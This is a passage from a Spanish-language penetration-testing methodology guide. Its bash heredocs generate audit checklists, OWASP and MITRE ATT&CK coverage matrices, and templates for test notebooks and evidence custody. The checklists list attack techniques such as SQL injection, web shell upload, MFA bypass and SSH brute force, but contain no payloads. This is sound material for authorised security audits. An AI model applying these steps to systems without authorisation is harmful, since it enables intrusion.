echo "Compliance Audit,Semestral,Controles ISO27001,Cumplimiento normativo,$(date -d '+6 months' +%Y-%m-%d)" >> 18_lecciones/plan_auditorias.csv

# Crear template para tracking de mejoras
cat > 18_lecciones/improvement_tracker.md << 'EOF'
# Tracker de Mejoras - Template

## Período: [MES/AÑO]

### KPIs de Seguridad
| Métrica | Objetivo | Actual | Trend | Acción |
|---------|----------|---------|-------|--------|
| MTTR Críticos | <2h | Xh | ↓/↑/→ | Acción |
| Vulnerabilidades Críticas | 0 | X | ↓/↑/→ | Acción |  
| False Positives | <5% | X% | ↓/↑/→ | Acción |
| Security Training | 95% | X% | ↓/↑/→ | Acción |

### Mejoras Implementadas
- [ ] Mejora 1: Descripción
- [ ] Mejora 2: Descripción  
- [ ] Mejora 3: Descripción

### Lecciones del Período
- **Qué funcionó bien**: 
- **Qué necesita mejora**:
- **Acciones para próximo período**:
EOF
```

### ✅ Checklist final del Punto 18:

```bash
echo "[ ] Feedback stakeholders documentado
[ ] Playbooks y checklists actualizados  
[ ] Roadmap de madurez de seguridad creado
[ ] Métricas y plan de seguimiento definidos
[ ] Ejercicios Purple Team programados
[ ] Plan de auditorías de seguimiento establecido
[ ] Templates de tracking implementados
[ ] KPIs de mejora continua definidos" > 18_lecciones/checklist_punto18.txt
```

### 🎯 Resultado esperado:

```bash
echo "Se cierra la auditoría con documentación completa, aprendizajes incorporados, procesos optimizados y roadmap de mejora continua listo para futuras pruebas y auditorías con métricas de seguimiento establecidas" >> 18_lecciones/resultado_punto18.txt
```

---

## PUNTO 19 — Apéndices

### 🎯 Objetivo
Proveer herramientas, plantillas y referencias que permitan estandarizar, acelerar y documentar todas las fases de pentesting. Todo contenido es reutilizable para auditorías futuras.

### A. Checklists por dominio

#### 🌐 Externo / Internet-Facing:

```bash
cat > 19_apendices/checklist_externo.md << 'EOF'
# Checklist - Perímetro Externo

## Descubrimiento de hosts
- [ ] Subdomain enumeration (amass, sublist3r, subfinder)
- [ ] DNS zone transfer attempts
- [ ] Certificate transparency logs (crt.sh)
- [ ] Search engine reconnaissance
- [ ] Social media intelligence gathering

## Escaneo de puertos
- [ ] Full TCP port scan (nmap -p-)
- [ ] UDP scan for critical services
- [ ] Service version detection (-sV)
- [ ] OS fingerprinting (-O)
- [ ] NSE vulnerability scripts (--script vuln)

## Fingerprinting de servicios
- [ ] Web server identification (whatweb, wappalyzer)
- [ ] Technology stack analysis
- [ ] CMS identification and version
- [ ] API documentation discovery
- [ ] Service banner grabbing

## Análisis TLS/SSL
- [ ] SSL/TLS configuration (testssl.sh, sslscan)
- [ ] Certificate validity and chain
- [ ] Cipher suite strength
- [ ] Protocol version support
- [ ] HSTS implementation

## WAF/CDN Detection
- [ ] WAF identification (wafw00f, nmap scripts)
- [ ] CDN detection and configuration
- [ ] Rate limiting testing
- [ ] Bypass techniques evaluation
- [ ] IP geolocation and infrastructure

## Quick wins
- [ ] Default credentials testing
- [ ] Information disclosure in headers
- [ ] Directory/file enumeration
- [ ] Backup and temp files discovery
- [ ] Configuration files exposure
EOF
```

#### 🕷️ Web / API:

```bash
cat > 19_apendices/checklist_web.md << 'EOF'
# Checklist - Aplicaciones Web y APIs

## Mapeo de rutas y funcionalidades
- [ ] Site mapping (Burp Spider, OWASP ZAP)
- [ ] Directory enumeration (gobuster, feroxbuster, ffuf)
- [ ] Parameter discovery (Arjun, parameth)
- [ ] API endpoint enumeration
- [ ] GraphQL introspection
- [ ] WebSocket endpoint discovery

## Autenticación y Autorización
- [ ] Username enumeration
- [ ] Password policy testing
- [ ] Brute force protection
- [ ] Session management analysis
- [ ] JWT token security
- [ ] OAuth implementation review
- [ ] Multi-factor authentication bypass
- [ ] Privilege escalation testing

## Inyecciones
- [ ] SQL Injection (sqlmap, manual testing)
- [ ] NoSQL Injection (MongoDB, CouchDB)
- [ ] LDAP Injection
- [ ] Command Injection (OS commands)
- [ ] XML/XXE Injection
- [ ] Template Injection (SSTI)
- [ ] XPath Injection

## Cross-Site Attacks
- [ ] XSS (Reflected, Stored, DOM-based)
- [ ] CSRF protection testing
- [ ] Cross-origin resource sharing (CORS)
- [ ] Clickjacking protection
- [ ] Cross-site WebSocket hijacking

## Subida de archivos
- [ ] File type validation bypass
- [ ] File size restrictions
- [ ] Malicious file upload (web shells)
- [ ] Path traversal in uploads
- [ ] Image metadata exploitation
- [ ] Archive extraction vulnerabilities

## Lógica de negocio
- [ ] Business workflow analysis
- [ ] Race conditions testing
- [ ] Price manipulation
- [ ] Quantity/discount abuse
- [ ] Workflow bypass attempts
- [ ] Time-based attacks

## APIs específicas
- [ ] REST API security testing
- [ ] GraphQL security assessment
- [ ] SOAP service analysis
- [ ] API versioning issues
- [ ] Rate limiting and throttling
- [ ] API key exposure and management

## Integraciones externas
- [ ] Third-party service integration
- [ ] SSO implementation security
- [ ] Payment gateway security
- [ ] Social login vulnerabilities
- [ ] External API consumption security
EOF
```

#### ☁️ Cloud:

```bash
cat > 19_apendices/checklist_cloud.md << 'EOF'
# Checklist - Seguridad en Cloud

## Descubrimiento de activos
- [ ] S3 bucket enumeration (AWS)
- [ ] Azure storage account discovery
- [ ] GCP storage bucket identification
- [ ] Public resource discovery
- [ ] Subdomain cloud service mapping

## Permisos IAM
- [ ] User and role enumeration
- [ ] Policy analysis and privilege escalation
- [ ] Service account security
- [ ] Cross-account trust relationships
- [ ] Resource-based policies
- [ ] Temporary credential security

## Cifrado de datos
- [ ] Encryption in transit validation
- [ ] Encryption at rest verification
- [ ] Key management practices
- [ ] Database encryption status
- [ ] Backup encryption verification

## Serverless
- [ ] Lambda function security (AWS)
- [ ] Azure Functions assessment
- [ ] Google Cloud Functions review
- [ ] Function permissions and triggers
- [ ] Environment variable security
- [ ] Code injection in serverless

## Redes y conectividad
- [ ] VPC/VNet configuration
- [ ] Security group analysis
- [ ] Network ACL review
- [ ] Firewall rule assessment
- [ ] VPN and direct connect security
- [ ] DNS configuration review

## Contenedores
- [ ] Container image vulnerability scanning
- [ ] Kubernetes cluster security
- [ ] Docker daemon security
- [ ] Container escape testing
- [ ] Registry security assessment
- [ ] Orchestration platform security

## CI/CD Pipeline
- [ ] Build server security
- [ ] Secret management in pipelines
- [ ] Code repository access controls
- [ ] Artifact integrity verification
- [ ] Deployment permission review
- [ ] Pipeline injection vulnerabilities

## SaaS Integration
- [ ] Third-party SaaS security
- [ ] API integration security
- [ ] Data sharing agreements compliance
- [ ] Single sign-on integration
- [ ] Vendor security assessment
EOF
```

### B. Matrices de cobertura

#### 🛡️ OWASP ASVS / Top10:

```bash
cat > 19_apendices/owasp_coverage.csv << 'EOF'
OWASP_Category,Test_Performed,Tools_Used,Result,Evidence_File,Remediation_Status
A01_Broken_Access_Control,Authorization testing,Burp Suite,Vulnerable,evidence_A01.txt,Pending
A02_Cryptographic_Failures,SSL/TLS analysis,testssl.sh,Secure,ssl_scan.txt,N/A
A03_Injection,SQL Injection testing,sqlmap,Vulnerable,sqli_evidence.txt,In Progress
A04_Insecure_Design,Architecture review,Manual,Review needed,architecture_notes.txt,Pending
A05_Security_Misconfiguration,Config analysis,Nessus,Vulnerable,config_scan.txt,Pending
A06_Vulnerable_Components,Component analysis,OWASP Dependency Check,Vulnerable,component_report.html,In Progress
A07_Identification_Authentication,Auth testing,Burp Suite,Secure,auth_testing.txt,N/A
A08_Software_Data_Integrity,Integrity verification,Manual,Secure,integrity_check.txt,N/A
A09_Security_Logging_Monitoring,Log analysis,Manual review,Insufficient,log_analysis.txt,Pending
A10_Server_Side_Request_Forgery,SSRF testing,Burp Suite,Not Vulnerable,ssrf_test.txt,N/A
EOF
```

#### 🎯 MITRE ATT&CK Coverage:

```bash
cat > 19_apendices/mitre_coverage.csv << 'EOF'
Tactic,Technique,Sub_Technique,Test_Conducted,Detection_Quality,Evidence,Remediation
Initial_Access,T1078,Valid Accounts,Yes,Good,Credential stuffing detected,MFA implemented
Initial_Access,T1190,Exploit Public-Facing Application,Yes,Excellent,Web shell blocked,WAF deployed
Execution,T1059.001,PowerShell,Yes,Good,PowerShell logging enabled,Script execution monitored
Execution,T1059.003,Windows Command Shell,Yes,Fair,Process creation logged,Enhanced monitoring needed
Persistence,T1053,Scheduled Task/Job,Yes,Poor,Not detected,Detection rule needed
Persistence,T1547.001,Registry Run Keys,No,N/A,N/A,Test needed
Defense_Evasion,T1055,Process Injection,Yes,Good,Sysmon detected,Additional hunting rules
Defense_Evasion,T1070.001,Clear Windows Event Logs,No,N/A,N/A,Test needed
Credential_Access,T1003.001,LSASS Memory,Yes,Excellent,Credential dumping blocked,Credential Guard enabled
Discovery,T1018,Remote System Discovery,Yes,Fair,Network scanning detected,Enhanced network monitoring
Lateral_Movement,T1021.001,Remote Desktop Protocol,Yes,Good,RDP brute force detected,Account lockout policy
Collection,T1005,Data from Local System,No,N/A,N/A,Test needed
Exfiltration,T1041,Exfiltration Over C2 Channel,Yes,Good,Suspicious traffic detected,DLP implemented
Impact,T1486,Data Encrypted for Impact,No,N/A,N/A,Ransomware simulation needed
EOF
```

### C. Plantillas

#### 📊 Cuaderno de pruebas:

```bash
cat > 19_apendices/template_cuaderno.md << 'EOF'
# Cuaderno de Pruebas - Template

## Información General
- **Fecha**: $(date +%Y-%m-%d)
- **Auditor**: [NOMBRE]
- **Cliente**: [CLIENTE]
- **Fase**: [RECONNAISSANCE/SCANNING/EXPLOITATION/POST-EXPLOITATION]

## Registro de Actividades

### Entrada #001
- **Timestamp**: $(date +%Y-%m-%d_%H:%M:%S)
- **Objetivo**: [IP/DOMAIN/SERVICE]
- **Comando**: `nmap -sV -sC target.com`
- **Resultado**: 
  ```
  [OUTPUT DEL COMANDO]
  ```
- **Evidencia**: screenshot_001.png, nmap_001.txt
- **Notas**: Puerto 22 abierto, SSH-2.0-OpenSSH_7.4
- **Seguimiento**: Probar brute force en SSH
- **Hash evidencia**: sha256sum resultado_001.txt

### Entrada #002
- **Timestamp**: $(date +%Y-%m-%d_%H:%M:%S)
- **Objetivo**: [TARGET]
- **Comando**: `[COMMAND]`
- **Resultado**: [RESULT]
- **Evidencia**: [FILES]
- **Notas**: [OBSERVATIONS]
- **Seguimiento**: [NEXT_STEPS]
- **Hash evidencia**: [HASH]

## Vulnerabilidades Identificadas

### VULN-001
- **Tipo**: SQL Injection
- **Severidad**: Crítica
- **Ubicación**: /login.php?user=
- **Evidencia**: sqlmap_output.txt, screenshot_sqli.png  
- **Explotación**: Exitosa - acceso a BD
- **Impacto**: Compromiso total de datos de usuarios
- **Recomendación**: Implementar prepared statements

## Hallazgos por Categoría

### Críticos
- [ ] VULN-001: SQL Injection en login
- [ ] VULN-002: RCE en servicio web

### Altos  
- [ ] VULN-003: Credenciales por defecto
- [ ] VULN-004: Directorio transversal

### Medios
- [ ] VULN-005: Información sensible expuesta
- [ ] VULN-006: Headers de seguridad faltantes

### Bajos
- [ ] VULN-007: Versión de servidor expuesta
- [ ] VULN-008: SSL configuración débil
EOF
```

#### 📁 Registro de evidencias:

```bash
cat > 19_apendices/template_evidencias.md << 'EOF'
# Registro de Evidencias - Template

## Información del Caso
- **ID Auditoría**: AUD-$(date +%Y%m%d)
- **Cliente**: [CLIENTE]
- **Fecha inicio**: $(date +%Y-%m-%d)
- **Fecha fin**: [FECHA_FIN]
- **Auditor principal**: [NOMBRE]

## Índice de Evidencias

| ID | Timestamp | Tipo | Descripción | Ubicación | Hash SHA256 | Estado |
|----|-----------|------|-------------|-----------|-------------|---------|
| EV-001 | $(date +%Y-%m-%d_%H:%M:%S) | Screenshot | Resultado nmap inicial | evidence/screenshots/ev001.png | abc123... | Verificado |
| EV-002 | $(date +%Y-%m-%d_%H:%M:%S) | Log | Output sqlmap injection | evidence/logs/ev002.txt | def456... | Verificado |
| EV-003 | $(date +%Y-%m-%d_%H:%M:%S) | Pcap | Tráfico de red capturado | evidence/network/ev003.pcap | ghi789... | Verificado |
| EV-004 | $(date +%Y-%m-%d_%H:%M:%S) | Report | Scan de vulnerabilidades | evidence/reports/ev004.html | jkl012... | Verificado |

## Cadena de Custodia

### Evidencia EV-001
- **Recolectada por**: [AUDITOR]
- **Fecha/Hora**: $(date +%Y-%m-%d_%H:%M:%S)
- **Método**: Screenshot automatizado
- **Herramienta**: Flameshot v0.10.2
- **Ubicación original**: /home/auditor/screenshots/
- **Hash original**: [HASH]
- **Transferida a**: Repositorio seguro
- **Cifrado**: AES-256 con GPG
- **Verificada por**: [SUPERVISOR]

## Integridad de Evidencias

### Verificación Inicial
```bash
# Generar hashes de todas las evidencias
find evidence/ -type f -exec sha256sum {} \; > evidence_hashes_$(date +%Y%m%d).txt

# Firmar archivo de hashes
gpg --clearsign evidence_hashes_$(date +%Y%m%d).txt
```

### Verificación Final
```bash
# Verificar integridad antes del cierre
sha256sum -c evidence_hashes_$(date +%Y%m%d).txt
```
